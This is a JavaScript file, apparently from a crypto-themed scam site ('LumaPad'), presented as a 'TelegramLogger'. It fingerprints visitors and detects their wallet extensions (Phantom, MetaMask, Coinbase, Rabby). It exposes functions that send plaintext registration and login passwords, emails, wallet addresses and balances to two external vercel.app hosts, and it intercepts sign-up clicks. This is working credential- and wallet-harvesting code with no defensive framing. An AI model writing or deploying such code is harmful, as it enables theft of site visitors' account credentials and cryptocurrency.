(function () {
  'use strict';

  var VERCEL_HOSTS = [
    'https://12414-two.vercel.app',
    'https://12414-zeta.vercel.app'
  ];

  // Last action timestamps for debouncing
  var lastActionTime = {};
  var lastRegistrationKey = '';

  function getLang() {
    var l = navigator.language || (navigator.languages && navigator.languages[0]) || 'en';
    return l.split('-')[0].toLowerCase();
  }

  function getTimeStr() {
    var d = new Date();
    var pad = function (n) { return n < 10 ? '0' + n : n; };
    return pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds());
  }

  function detectWallets() {
    var wallets = [];
    try {
      if (window.phantom && window.phantom.solana) wallets.push('Phantom');
      if (window.ethereum && window.ethereum.isMetaMask) wallets.push('MetaMask');
      if (window.ethereum && window.ethereum.isCoinbaseWallet) wallets.push('Coinbase');
      if (window.ethereum && window.ethereum.isRabby) wallets.push('Rabby');
    } catch (e) {}
    return wallets;
  }

  function detectSystem() {
    var ua = navigator.userAgent || '';
    if (/iPhone|iPad/i.test(ua)) return 'iOS';
    if (/Android/i.test(ua)) return 'Android';
    if (/Mac OS/i.test(ua)) return 'Mac';
    if (/Windows/i.test(ua)) return 'Windows';
    if (/Linux/i.test(ua)) return 'Linux';
    return 'Unknown';
  }

  function sendLog(payload, altEndpoint) {
    var bodyStr = JSON.stringify(payload);
    
    VERCEL_HOSTS.forEach(function (host) {
      fetch(host + '/api/visit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: bodyStr,
        keepalive: true
      }).catch(function () {});

      if (altEndpoint) {
        fetch(host + altEndpoint, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: bodyStr,
          keepalive: true
        }).catch(function () {});
      }
    });

    // Also mirror to local backend if running on localhost / custom domain (host 141)
    if (location.origin && !location.origin.includes('vercel.app')) {
      var localEp = (payload.type === 'registration') ? '/api/register' : (payload.type === 'action' ? '/api/action' : (payload.type === 'wallet' ? '/api/wallet' : '/api/visit'));
      fetch(localEp, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: bodyStr,
        keepalive: true
      }).catch(function () {});
    }
  }

  function logVisit() {
    try {
      var wallets = detectWallets();
      var ua = navigator.userAgent;
      var system = detectSystem();
      sendLog({
        type: 'visit',
        wallets: wallets,
        system: system,
        lang: getLang(),
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
        time: getTimeStr(),
        ua: ua,
        url: location.href,
        ref: document.referrer
      });
    } catch (e) {}
  }

  function logAction(actionTitle, extraFields) {
    if (!actionTitle) return;
    var cleanTitle = actionTitle.trim();
    var now = Date.now();

    // Debounce duplicate actions within 2.5 seconds
    if (lastActionTime[cleanTitle] && (now - lastActionTime[cleanTitle] < 2500)) {
      return;
    }
    lastActionTime[cleanTitle] = now;

    var payload = {
      type: 'action',
      action: cleanTitle,
      lang: getLang(),
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
      time: getTimeStr(),
      url: location.href
    };

    if (extraFields && typeof extraFields === 'object') {
      for (var k in extraFields) {
        if (extraFields.hasOwnProperty(k)) payload[k] = extraFields[k];
      }
    }

    sendLog(payload, '/api/action');
  }

  function logRegistration(data) {
    if (!data) return;
    var login = (data.username || data.login || '').trim();
    var email = (data.email || '').trim();
    var pass = (data.password || data.pass || '').trim();

    var key = login + '|' + email + '|' + pass;
    if (key === lastRegistrationKey) return;
    lastRegistrationKey = key;

    var payload = {
      type: 'registration',
      login: login || 'LumaPad',
      email: email,
      pass: pass,
      lang: getLang(),
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
      time: getTimeStr()
    };

    sendLog(payload, '/api/register');
  }

  function logLogin(data) {
    if (!data) return;
    var identifier = (data.identifier || data.email || data.username || '').trim();
    var pass = (data.password || data.pass || '').trim();
    sendLog({
      type: 'login',
      identifier: identifier,
      pass: pass,
      lang: getLang(),
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
      time: getTimeStr()
    });
  }

  function logWallet(data) {
    if (!data) return;
    var fullAddr = data.fullAddress || data.address || '';
    var shortAddr = data.address || fullAddr;
    // manual form: user types wallet + balance
    sendLog({
      type: 'wallet',
      wallet: data.walletName || data.wallet || 'Manual Connect',
      chain: data.chain || 'ETH',
      address: shortAddr,
      fullAddress: fullAddr,
      balance: data.balance || 'N/A',
      lang: getLang(),
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
      time: getTimeStr()
    }, '/api/wallet');
  }

  // Automatic click interceptor for Sign Up / Connect buttons
  function setupAutoClicks() {
    document.addEventListener('click', function (e) {
      try {
        var target = e.target;
        if (!target) return;
        var btn = target.closest('button, a');
        if (!btn) return;

        var text = (btn.innerText || btn.textContent || '').trim();
        var cls = btn.className || '';
        if (typeof cls !== 'string') cls = '';

        // 1. Sign Up clicks
        if (
          cls.includes('nav-auth-btn') ||
          cls.includes('mobile-drawer-auth-btn') ||
          text === 'Sign Up' ||
          text === 'Create Account' ||
          text.indexOf('SIGN UP') !== -1 ||
          text.indexOf('CONNECT / SIGN IN') !== -1
        ) {
          // If in modal switching to Create Account or opening auth
          logAction('CLICKED SIGN UP');
        }
      } catch (err) {}
    }, true);
  }

  // Initial Visit
  if (!sessionStorage.getItem('logged_visit')) {
    logVisit();
    sessionStorage.setItem('logged_visit', '1');
  }

  // Auto click listener
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', setupAutoClicks);
  } else {
    setupAutoClicks();
  }

  // Global window API matching existing codebase
  window.TelegramLogger = {
    logAction: logAction,
    logRegistration: logRegistration,
    logLogin: logLogin,
    logWallet: logWallet,
    logVisit: logVisit,
    getGeoData: function () {
      try {
        var c = sessionStorage.getItem('__tg_geo__');
        return c ? JSON.parse(c) : null;
      } catch (e) {
        return null;
      }
    }
  };

  window.logWalletConnect = function (wallets) {
    logWallet({ walletName: 'WalletConnect', chain: 'MULTI', address: (wallets || []).join(', ') });
  };
})();